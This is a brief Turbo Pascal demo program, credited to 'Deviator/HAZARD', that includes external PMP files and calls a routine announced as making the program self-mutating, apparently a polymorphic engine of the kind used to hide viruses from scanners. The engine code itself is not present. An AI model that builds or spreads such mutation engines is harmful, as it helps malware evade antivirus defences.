   {$I SWITCHES.PMP}
   {$M  16000,4096,65535}
   Program PMPDEmo;
   Uses Dos;
   {$I VARS.PMP}

   {$I PMP0.PMP}
   {$I PMP1.PMP}
   {$I PMP2.PMP}
   {$I PMP3.PMP}
   {$I PMP4.PMP}

    Begin
    Randomize;
    Writeln('PMP Demo by Deviator/HAZARD. This program is self-mutating !!!');
    PMP_Mutate;
   End.
